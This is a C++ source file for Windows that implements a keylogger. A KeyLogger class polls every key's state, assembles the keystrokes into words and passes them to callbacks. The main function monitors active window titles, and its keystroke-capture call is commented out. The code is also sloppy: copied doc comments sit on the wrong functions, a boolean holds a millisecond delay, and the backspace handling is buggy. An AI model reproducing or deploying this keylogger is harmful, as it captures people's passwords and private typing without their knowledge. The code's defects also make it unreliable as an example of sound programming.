#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tchar.h>
#include <functional>
#include <atlstr.h>
#include <locale>
#include <codecvt>
#include <psapi.h>
#include <shlwapi.h>
#include <libloaderapi.h>
#include "ProcessMonitor.h"
#include "Looper.h"
#pragma comment(lib, "psapi.lib")
/*
* Return the current pressed key or null
*/
bool IsSpecialKey(int S_Key) {
    switch (S_Key)
    {
        case '¾': 
        case VK_SHIFT:
        case VK_RBUTTON:
        case VK_CAPITAL:
        case VK_CONTROL:
        case VK_MENU:
            return true;
        default:
            return false;
    }
}
/*
* Return the current pressed key or null
*/
class KeyLogger {
    /*
    * All the words written by the user.
    * public: static std::vector<std::string> words;
    */
    /*
    * Start the KeyLogger loop.
    */
    public: static void Start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        std::string word;
        while (true) {
            Sleep(10);
            word = KeyLogger::OnNewWord(word, charCallback, wordCallback);
        }
    }
    /*
    * Start the KeyLogger loop.
    */
    public: static std::string OnNewWord(std::string word, void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        char character = KeyLogger::CatchChar();
        if (character == NULL) return word;
        word = KeyLogger::BuildWord(character, word, wordCallback);
        charCallback(character);
        return word;
    }
    /*
    * Return the current pressed key or null
    */
    public: static std::string BuildWord(char character, std::string word, const std::function<void(std::string)>& callback)
    {
        if (character == NULL) return word;
        if (IsWordEnder((int)character)) {
            callback(word);
            return "";
        }
        if ((int)character == VK_BACK) word.pop_back();
        return word + character;
    }
    /*
    * Return the current pressed key or null
    */
    public: static bool IsWordEnder(int character)
    {
        switch (character)
        {
            case VK_RETURN:
            case VK_SPACE:
            case VK_TAB:
            case VK_UP:
            case VK_DOWN:
            case VK_LEFT:
            case VK_RIGHT:
                return true;
            default:
                return false;
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static char CatchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
        }
        return NULL;
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachChar(void(*callback)(char))
    {
        KeyLogger::Start(callback, [](std::string s) {});
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachWord(const std::function<void(std::string)>& callback)
    {
        KeyLogger::Start([](char c){}, callback);
    }
};
/// <summary>
/// 
/// </summary>
/// <returns></returns>
int main()
{
    bool monitor = true;
    bool delay = 50; // 50 ms
    std::vector<std::string> words;
    std::string word = "";
    std::string activeWindow = "";
    // infinite loop each 50 ms
    Looper::DoWhile(delay, monitor, [&word, &activeWindow]() {
        // word assignation
        // word = KeyLogger::OnNewWord(word, [](char c) {}, [](std::string w) {
        //    // new word appear!!
        //    std::cout << w << std::endl;
        // });
        // active window assignation
        activeWindow = ProcessMonitor::OnWindowChange(activeWindow, [](std::string w) {
            // active window has been changed!!
            std::cout << w << std::endl;
        });
    });
    return 0;
}
